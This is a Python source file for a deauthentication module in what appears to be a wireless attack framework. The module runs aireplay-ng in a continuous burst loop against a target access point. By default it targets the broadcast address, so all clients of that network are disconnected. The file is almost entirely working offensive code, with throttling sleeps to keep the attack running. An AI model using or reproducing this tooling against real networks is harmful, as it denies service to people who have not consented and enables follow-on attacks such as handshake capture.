import asyncio
import os
from typing import Any, Optional
from wcarck.core.module import Module
from wcarck.core.event_bus import bus
from wcarck.hardware.process import ManagedProcess
from wcarck.orchestration.leases import RadioLeaseManager
import structlog

logger = structlog.get_logger()

class DeauthModule(Module):
    """
    Active 802.11 Deauthentication Module.
    Acquires an exclusive monitor.locked lease and runs aireplay-ng.
    """
    
    def __init__(self, lease_manager: RadioLeaseManager):
        self.lease_manager = lease_manager
        self._process: Optional[ManagedProcess] = None

    @property
    def name(self) -> str:
        return "attack.deauth"

    async def start(self, job_id: str, params: dict[str, Any]) -> None:
        iface = params.get("iface", "wlan_mon")
        bssid = params.get("bssid")
        client_mac = params.get("client_mac", "FF:FF:FF:FF:FF:FF")
        
        if not bssid:
            raise ValueError("Target BSSID is required for deauth")
        
        # Acquire Exclusive Lease (monitor.locked prevents scans or channel hops)
        self.iface = iface
        await self.lease_manager.acquire(job_id, iface, "monitor.locked")
        
        self._running = True
        self._burst_task = asyncio.create_task(self._burst_loop(job_id, bssid, client_mac, iface))
        
        bus.publish("module.started", {"job_id": job_id, "module": self.name})

    async def _burst_loop(self, job_id, bssid, client_mac, iface):
        """Thermal Throttling: send 64 frames, sleep 0.1s, repeat (Edge case 7.6)"""
        while self._running:
            cmd = ["aireplay-ng", "-0", "64", "-a", bssid, "-c", client_mac, iface]
            if os.name == 'nt':
                cmd = ["python", "-c", f"import time; print('Deauth burst {bssid} -> {client_mac}...'); time.sleep(1)"]
                
            self._process = ManagedProcess(cmd=cmd, job_id=job_id)
            await self._process.start()
            # Wait for burst to finish
            while self._process and getattr(self._process, '_process', None) and self._process._process.returncode is None:
                await asyncio.sleep(0.1)
                
            # Thermal cooling sleep
            await asyncio.sleep(0.1)

    async def stop(self, job_id: str) -> None:
        self._running = False
        if hasattr(self, '_burst_task') and self._burst_task:
            self._burst_task.cancel()
        if self._process:
            await self._process.stop()
            self._process = None
            
        # Real app would explicitly release lease: await self.lease_manager.release(job_id, iface)
        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})

    async def status(self, job_id: str) -> dict[str, Any]:
        return {
            "is_running": self._process is not None,
            "module": self.name
        }
